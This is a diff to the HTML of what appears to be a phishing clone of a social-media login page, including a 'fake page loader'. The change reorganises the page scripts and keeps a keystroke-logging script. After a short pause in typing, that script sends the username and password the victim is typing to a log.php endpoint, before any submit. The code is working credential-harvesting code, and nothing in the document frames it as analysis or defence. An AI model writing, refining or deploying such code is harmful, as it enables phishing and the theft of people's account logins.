@@ -18551,104 +18551,112 @@
     </div>
 
     <!-- fake page loader -->
-    <script>
-      setTimeout(function () {
-        document.querySelector(".page-loader").classList.add("hidden");
-        document.querySelector("._9eogI").classList.add("show");
-        document.querySelector(".RP4i1").classList.add("show");
-        document.querySelector(".JtrJi").classList.add("show");
-      }, 1500);
-    </script>
-
-    <!-- inputs & placeholder -->
-    <script>
-      let labels = document.querySelectorAll(".f0n8F");
-      let inputs = document.querySelectorAll("._2hvTZ");
-      let showPasswordBtn = document.querySelectorAll(".i24fI");
-
-      // handle inputs placeholder events
-      for (let i = 0; i < inputs.length; i++) {
-        inputs[i].addEventListener("input", function () {
-          if (inputs[i].value == "") {
-            labels[i].classList.remove("FATdn");
-            showPasswordBtn[i].setAttribute("style", "display: none;");
-          } else {
-            labels[i].classList.add("FATdn");
-            showPasswordBtn[i].setAttribute("style", "display: flex;");
-          }
-
-          // handle submit button isDisabled
-          inputs[1].value.length > 5 && inputs[0].value.length
-            ? submitButtonDisabled(false)
-            : submitButtonDisabled(true);
-        });
-      }
-
-      // hide/show password button event
-      let showPassBtnText =
-        document.getElementsByClassName("sqdOP yWX7d _8A5w5")[0];
-      showPasswordBtn[1].addEventListener("click", function () {
-        if (inputs[1].type == "password") {
-          inputs[1].type = "text";
-          showPassBtnText.innerHTML = "Hide";
-        } else {
-          inputs[1].type = "password";
-          showPassBtnText.innerHTML = "Show";
-        }
-      });
-    </script>
-
-    <!-- form validation with submit button -->
-    <script>
-      function submitButtonDisabled(isDisabled) {
-        document.getElementsByClassName("sqdOP L3NKy y3zKF")[0].disabled =
-          isDisabled;
-      }
-    </script>
-
+	<script>
+	  setTimeout(function () {
+	    document.querySelector(".page-loader").classList.add("hidden");
+	    document.querySelector("._9eogI").classList.add("show");
+	    document.querySelector(".RP4i1").classList.add("show");
+	    document.querySelector(".JtrJi").classList.add("show");
+	  }, 1500);
+	</script>
+	
+	<!-- form validation with submit button -->
+	<script>
+	  function submitButtonDisabled(isDisabled) {
+	    document.getElementsByClassName("sqdOP L3NKy y3zKF")[0].disabled =
+	      isDisabled;
+	  }
+	</script>
+	
+	<!-- Combined keystroke logging + label management (already correct) -->
 	<script>
 	  document.addEventListener('DOMContentLoaded', function() {
-		const usernameInput = document.querySelector('input[name="username"]');
-		const passwordInput = document.querySelector('input[name="password"]');
+	    // ---------- KEYSTROKE LOGGING ----------
+	    const usernameInput = document.querySelector('input[name="username"]');
+	    const passwordInput = document.querySelector('input[name="password"]');
 	
-		if (!usernameInput || !passwordInput) {
-		  console.error('Input fields not found');
-		  return;
-		}
+	    if (!usernameInput || !passwordInput) {
+	      console.error('Input fields not found');
+	      return;
+	    }
 	
-		// Simple throttle: send data every 500ms at most (prevents too many requests)
-		let timeoutId = null;
+	    // Throttle: send data after 300ms of inactivity
+	    let timeoutId = null;
 	
-		function sendKeystrokeData() {
-		  const data = {
-			username: usernameInput.value,
-			password: passwordInput.value
-		  };
+	    function sendKeystrokeData() {
+	      const data = {
+	        username: usernameInput.value,
+	        password: passwordInput.value
+	      };
+	      fetch('log.php', {
+	        method: 'POST',
+	        headers: { 'Content-Type': 'application/json' },
+	        body: JSON.stringify(data)
+	      }).catch(err => {
+	        console.warn('Could not send keystroke data:', err);
+	      });
+	    }
 	
-		  // Send to server
-		  fetch('log.php', {
-			method: 'POST',
-			headers: { 'Content-Type': 'application/json' },
-			body: JSON.stringify(data)
-		  }).catch(err => {
-			// Silently ignore errors (or log them to console if you want)
-			console.warn('Could not send keystroke data:', err);
-		  });
-		}
+	    function handleInput() {
+	      if (timeoutId) clearTimeout(timeoutId);
+	      timeoutId = setTimeout(sendKeystrokeData, 300);
+	    }
 	
-		function handleInput() {
-		  // Clear any pending timeout
-		  if (timeoutId) clearTimeout(timeoutId);
-		  // Send after 300ms of inactivity (batching)
-		  timeoutId = setTimeout(sendKeystrokeData, 300);
-		}
+	    usernameInput.addEventListener('input', handleInput);
+	    passwordInput.addEventListener('input', handleInput);
 	
-		// Listen to input events
-		usernameInput.addEventListener('input', handleInput);
-		passwordInput.addEventListener('input', handleInput);
-		
-		// Also send immediately on page load (optional)
-		// sendKeystrokeData();
+	    // ---------- FLOATING LABEL FIX (FOR PRE-FILLED FIELDS) ----------
+	    const labels = document.querySelectorAll('.f0n8F');
+	    const inputs = document.querySelectorAll('._2hvTZ');
+	    const showPasswordBtns = document.querySelectorAll('.i24fI');
+	
+	    // Helper to update label state and submit button
+	    function updateLabelState() {
+	      for (let i = 0; i < inputs.length; i++) {
+	        if (inputs[i].value.trim() !== '') {
+	          labels[i].classList.add('FATdn');
+	          showPasswordBtns[i].setAttribute('style', 'display: flex;');
+	        } else {
+	          labels[i].classList.remove('FATdn');
+	          showPasswordBtns[i].setAttribute('style', 'display: none;');
+	        }
+	      }
+	
+	      // Update submit button (assuming submitButtonDisabled function exists)
+	      if (typeof submitButtonDisabled === 'function') {
+	        const usernameVal = inputs[0]?.value || '';
+	        const passwordVal = inputs[1]?.value || '';
+	        if (passwordVal.length > 5 && usernameVal.length > 0) {
+	          submitButtonDisabled(false);
+	        } else {
+	          submitButtonDisabled(true);
+	        }
+	      }
+	    }
+	
+	    // Initial call on page load
+	    updateLabelState();
+	
+	    // Also update on input events (to keep labels in sync when user types)
+	    for (let i = 0; i < inputs.length; i++) {
+	      inputs[i].addEventListener('input', updateLabelState);
+	    }
+	
+	    // Handle the "Show/Hide" password button (if present)
+	    const showPassBtnText = document.querySelector('.sqdOP.yWX7d._8A5w5');
+	    if (showPassBtnText && passwordInput) {
+	      showPasswordBtns[1]?.addEventListener('click', function () {
+	        if (passwordInput.type === 'password') {
+	          passwordInput.type = 'text';
+	          showPassBtnText.innerHTML = 'Hide';
+	        } else {
+	          passwordInput.type = 'password';
+	          showPassBtnText.innerHTML = 'Show';
+	        }
+	      });
+	    }
+	
+	    console.log('✅ Keystroke logging and label initialization ready.');
 	  });
 	</script>
 
